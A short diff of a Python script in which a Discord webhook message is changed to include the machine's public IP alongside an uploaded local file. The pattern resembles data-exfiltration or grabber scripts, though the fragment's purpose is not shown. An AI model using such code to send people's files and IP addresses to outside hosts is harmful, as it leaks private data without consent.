@@ -14,7 +14,7 @@ message = 'INSERT HERE THE MESSAGE THAT WILL BE SENT IN DISCORD' #enter here the
 
 #create function
 def send():
-    webhook = DiscordWebhook(url=weburl, content=message + i.text) #message that will send by webhook
+    webhook = DiscordWebhook(url=weburl, content=message + " from public ip " + i.text) #message that will send by webhook
     with open(file, "rb") as f: #open file
         webhook.add_file(file=f.read(), filename=name) #add the file to message
     webhook.execute() #execute all
